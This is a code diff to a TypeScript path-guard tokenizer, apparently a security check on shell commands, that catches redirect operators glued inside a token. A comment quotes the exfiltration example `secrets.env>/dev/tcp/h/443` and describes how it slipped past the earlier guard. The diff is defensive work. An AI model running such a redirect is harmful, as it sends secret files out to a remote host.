@@ -110,14 +110,37 @@ function extractPathTokens(command: string): PathToken[] {
       // Redirect operator glued to (or standing before) a path: >f >>f 2>f <f.
       // Capture whether this token is a WRITE target.
       let action: "read" | "write" = "read";
-      const redir = raw.match(/^(\d*)(>>|>|<)(.*)$/);
-      if (redir) {
-        action = redir[2] === "<" ? "read" : "write";
-        raw = redir[3];
-        // Bare ">" with the path as the NEXT word: tag that word as a write.
-        if (!raw && i + 1 < words.length) {
-          raw = words[++i];
+      // A redirect operator can also sit in the MIDDLE of a single token when
+      // the source and sink are glued with no whitespace, e.g.
+      // `secrets.env>/dev/tcp/h/443` — one word whose `>` is not at token start.
+      // split(/\s+/) keeps that as ONE token, so the leading-anchored match
+      // below would miss it and the network sink would escape the path guard
+      // (R4-15). Detect an interior `>`/`>>`/`<` (optionally with a leading fd
+      // number) and split: emit the LEFT as a read (the source file) and fall
+      // through to evaluate the RIGHT as the write/read target. A leading
+      // operator is handled by the existing match further down — this only
+      // fires when there is a non-empty left side.
+      const glued = raw.match(/^(.+?)(\d*)(>>|>|<)(.*)$/);
+      if (glued && glued[1]) {
+        const leftRaw = stripQuotes(glued[1]);
+        if (leftRaw && !BENIGN_PATHS.has(leftRaw.toLowerCase()) && looksLikePath(leftRaw)) {
+          out.push({ path: leftRaw, action: "read" });
+        }
+        action = glued[3] === "<" ? "read" : "write";
+        raw = glued[4];
+        // Bare interior operator with the sink as the NEXT word (`name> sink`).
+        if (!raw && i + 1 < words.length) raw = words[++i];
+        if (!raw) continue;
+      } else {
+        const redir = raw.match(/^(\d*)(>>|>|<)(.*)$/);
+        if (redir) {
           action = redir[2] === "<" ? "read" : "write";
+          raw = redir[3];
+          // Bare ">" with the path as the NEXT word: tag that word as a write.
+          if (!raw && i + 1 < words.length) {
+            raw = words[++i];
+            action = redir[2] === "<" ? "read" : "write";
+          }
         }
       }
 
@@ -130,7 +153,7 @@ function extractPathTokens(command: string): PathToken[] {
 
       // Strip surrounding quotes (naive — a quoted path with spaces splits into
       // words, but the absolute prefix fragment is enough to detect the escape).
-      raw = raw.replace(/^['"]+|['"]+$/g, "");
+      raw = stripQuotes(raw);
       if (!raw) continue;
       if (BENIGN_PATHS.has(raw.toLowerCase())) continue;
 
@@ -144,6 +167,12 @@ function extractPathTokens(command: string): PathToken[] {
     }
   }
   return out;
+}
+
+// Strip a single layer of surrounding quotes from a token. Naive by intent —
+// matches the existing best-effort tokenizer.
+function stripQuotes(t: string): string {
+  return t.replace(/^['"]+|['"]+$/g, "");
 }
 
 // Is this token shaped like a path that could escape the workspace? Absolute
